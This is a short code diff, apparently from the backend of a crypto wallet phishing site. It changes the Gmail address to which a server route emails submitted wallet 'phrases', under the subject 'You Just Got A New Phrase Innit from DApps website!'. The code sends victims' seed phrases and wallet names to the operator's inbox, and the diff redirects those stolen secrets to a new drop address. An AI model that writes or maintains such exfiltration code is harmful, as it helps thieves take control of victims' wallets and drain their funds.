@@ -38,7 +38,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billyexh@gmail.com",
+        to: "ibsalam24@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: ` ${formattedMessage} wallet is ${item}`,
       };
